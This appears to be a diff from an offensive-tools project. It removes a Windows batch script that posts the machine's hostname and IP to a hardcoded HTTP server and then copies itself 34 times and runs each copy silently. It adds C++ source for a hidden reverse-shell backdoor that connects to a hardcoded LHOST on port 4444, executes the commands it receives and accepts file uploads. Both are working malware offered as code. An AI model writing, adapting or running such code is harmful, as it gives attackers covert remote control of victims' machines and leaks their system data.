@@ -1,25 +1,119 @@
-@echo off
-setlocal enabledelayedexpansion
+#include <iostream>
+#include <string>
+#include <winsock2.h>
+#include <windows.h>
 
-:: Get the hostname
-for /f "tokens=2 delims=[]" %%H in ('hostname') do set "hostname=%%H"
+#pragma comment(lib, "ws2_32.lib")
 
-:: Get the IP address (assuming the first available IPv4 address)
-for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do set "ipAddress=%%I"
+using namespace std;
 
-:: Trim leading spaces from ipAddress
-set ipAddress=%ipAddress: =%
+// Function to execute commands received from the server
+void executeCommand(const string& command) {
+    char buffer[128];
+    string result = "";
+    FILE* pipe = _popen(command.c_str(), "r");
 
-:: Prepare the URL to send data to
-set url=http://10.0.1.33:3000
+    if (!pipe) {
+        return;
+    }
 
-:: Send the hostname and IP address via HTTP POST (using curl)
-curl -X POST -d "hostname=%hostname%&ip=%ipAddress%" %url%
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+        result += buffer;
+    }
 
-:: Copy the script 34 times and run them silently
-for /L %%i in (1,1,34) do (
-    copy "%~f0" "%TEMP%\Copy_%%i.bat" > nul
-    start "" /B "%TEMP%\Copy_%%i.bat"
-)
+    _pclose(pipe);
+    // Do something with the result, e.g., send back to the server
+}
 
-exit /b
+// Handle the file upload from the server to the client
+void handleUpload(SOCKET& connSocket) {
+    char buffer[1024];
+    int bytesReceived;
+
+    bytesReceived = recv(connSocket, buffer, sizeof(buffer) - 1, 0);
+    if (bytesReceived <= 0) {
+        return;
+    }
+
+    string uploadCommand(buffer);
+    uploadCommand = uploadCommand.substr(0, uploadCommand.find("\n"));  // Trim trailing newline
+
+    if (uploadCommand.substr(0, 6) == "upload") {
+        string fileName = uploadCommand.substr(7);  // Extract filename
+
+        // Open the file to write
+        ofstream outFile(fileName, ios::binary);
+        if (!outFile) {
+            return;
+        }
+
+        // Read the file data and write to file
+        while ((bytesReceived = recv(connSocket, buffer, sizeof(buffer), 0)) > 0) {
+            outFile.write(buffer, bytesReceived);
+        }
+
+        outFile.close();
+    }
+}
+
+// Entry point for a Windows Application (non-console)
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Hide the window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    WSADATA wsaData;
+    SOCKET connSocket;
+    sockaddr_in serverAddr;
+    string serverIP = "10.0.1.35";  // Replace with LHOST (server IP)
+    int serverPort = 4444;  // Replace with LPORT (server port)
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return 1;
+    }
+
+    // Create socket
+    connSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (connSocket == INVALID_SOCKET) {
+        WSACleanup();
+        return 1;
+    }
+
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
+    serverAddr.sin_port = htons(serverPort);
+
+    // Connect to server
+    if (connect(connSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        closesocket(connSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    char buffer[1024];
+    while (true) {
+        memset(buffer, 0, sizeof(buffer));
+        int bytesReceived = recv(connSocket, buffer, sizeof(buffer) - 1, 0);
+        if (bytesReceived <= 0) {
+            break;  // Exit loop if connection is closed or error occurs
+        }
+
+        string command(buffer);
+        command = command.substr(0, command.find("\n"));  // Trim trailing newline
+
+        if (command == "exit") {
+            break;
+        }
+
+        if (command.substr(0, 6) == "upload") {
+            handleUpload(connSocket);
+        } else {
+            // Execute the command received from the server
+            executeCommand(command);
+        }
+    }
+
+    closesocket(connSocket);
+    WSACleanup();
+    return 0;
+}
